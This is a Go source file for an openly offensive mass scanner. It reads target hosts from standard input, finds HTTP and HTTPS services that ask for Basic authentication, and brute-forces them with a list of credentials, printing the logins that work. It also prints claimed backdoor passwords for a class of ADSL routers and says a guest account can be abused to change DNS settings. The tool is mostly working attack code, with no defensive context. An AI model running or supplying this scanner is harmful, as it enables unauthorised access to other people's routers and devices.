package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	//    "strconv"
	"crypto/tls"
	"encoding/base64"
	"io/ioutil"
)

var CONNECT_TIMEOUT time.Duration = 30
var READ_TIMEOUT time.Duration = 15
var WRITE_TIMEOUT time.Duration = 10

var workerGroup sync.WaitGroup
var logins []string
var mode, doExploit string

func zeroByte(a []byte) {
	for i := range a {
		a[i] = 0
	}
}

func setWriteTimeout(conn net.Conn, timeout time.Duration) {
	conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
}

func setReadTimeout(conn net.Conn, timeout time.Duration) {
	conn.SetReadDeadline(time.Now().Add(timeout * time.Second))
}

func getStringInBetween(str string, start string, end string) (result string) {

	s := strings.Index(str, start)
	if s == -1 {
		return
	}

	s += len(start)
	e := strings.Index(str, end)

	if s > 0 && e > s+1 {
		return str[s:e]
	} else {
		return "null"
	}
}

func httpAuthBrute(target string, realm string) {

	for i := 0; i < len(logins); i++ {

		conn, err := net.DialTimeout("tcp", target, CONNECT_TIMEOUT*time.Second)
		if err != nil {
			return
		}

		authToken := base64.StdEncoding.EncodeToString([]byte(logins[i]))

		setWriteTimeout(conn, WRITE_TIMEOUT)
		conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Basic " + authToken + "\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\nAuthorization: Basic " + authToken + "\r\n\r\n"))

		setReadTimeout(conn, READ_TIMEOUT)
		bytebuf := make([]byte, 2048)
		l, err := conn.Read(bytebuf)
		if err != nil || l <= 0 {
			zeroByte(bytebuf)
			conn.Close()
			return
		}

		if strings.Contains(string(bytebuf), "HTTP/1.1 200") || strings.Contains(string(bytebuf), "HTTP/1.0 200") || strings.Contains(string(bytebuf), "HTTP/1.0 302") || strings.Contains(string(bytebuf), "HTTP/1.1 302") {

			zeroByte(bytebuf)
			conn.Close()

			if doExploit == "0" {
				fmt.Printf("%s %s (%s)\r\n", target, logins[i], realm)
			} else if doExploit == "1" {
				fmt.Println("Not happening :P")
			}

			return
		} else {
			zeroByte(bytebuf)
			conn.Close()
			continue
		}
	}

	return
}

func processTarget(target string) {

	conf := &tls.Config{
		InsecureSkipVerify: true,
	}

	var conn net.Conn
	var err error

	if mode == "https" {
		conn, err = tls.Dial("tcp", target, conf)
		if err != nil {
			workerGroup.Done()
			return
		}
	} else {
		conn, err = net.DialTimeout("tcp", target, CONNECT_TIMEOUT*time.Second)
		if err != nil {
			workerGroup.Done()
			return
		}
	}

	setWriteTimeout(conn, WRITE_TIMEOUT)
	conn.Write([]byte("GET / HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"))

	setReadTimeout(conn, READ_TIMEOUT)
	bytebuf := make([]byte, 1024)
	l, err := conn.Read(bytebuf)
	if err != nil || l <= 0 {
		zeroByte(bytebuf)
		conn.Close()
		workerGroup.Done()
		return
	}

	if (strings.Contains(string(bytebuf), "HTTP/1.1 401") || strings.Contains(string(bytebuf), "HTTP/1.0 401")) && strings.Contains(string(bytebuf), "WWW-Authenticate:") {
		conn.Close()
		realm := getStringInBetween(string(bytebuf), "Basic realm=\"", "\"\r\n")
		if len(realm) >= 1 {
			httpAuthBrute(target, realm)
		} else {
			httpAuthBrute(target, "null")
		}

		workerGroup.Done()
		return
	} else {

		conn.Close()

		if strings.Contains(string(bytebuf), "Server: Virtual Web 0.9") {
			fmt.Println("ADSL Router detected. Inbuilt backdoor within ADSL routers, \n")
			fmt.Println("4 random numbers followed by aircon ex: 0413aircon\n")
			fmt.Println("guest:guest account does not permit dns change but allows configuration rewrite which allows dns change")
		}

		zeroByte(bytebuf)
		workerGroup.Done()
		return
	}
}

func main() {

	if len(os.Args) != 4 {
		fmt.Println("[Scanner] Missing argument <port/listen> <http/https> <exploit 1=yes,0=no>")
		return
	}

	content, err := ioutil.ReadFile("logins.txt")
	if err != nil {
		fmt.Println("[Scanner] Failed to open logins.txt")
		return
	}

	logins = strings.Split(string(content), "\n")
	fmt.Printf("[Scanner] Loaded %d logins from logins.txt\r\n", len(logins))

	mode = os.Args[2]
	doExploit = os.Args[3]

	for {
		reader := bufio.NewReader(os.Stdin)
		input := bufio.NewScanner(reader)

		for input.Scan() {
			if os.Args[1] == "listen" {
				workerGroup.Add(1)
				go processTarget(input.Text())
			} else {
				workerGroup.Add(1)
				go processTarget(input.Text() + ":" + os.Args[1])
			}
		}
	}
}
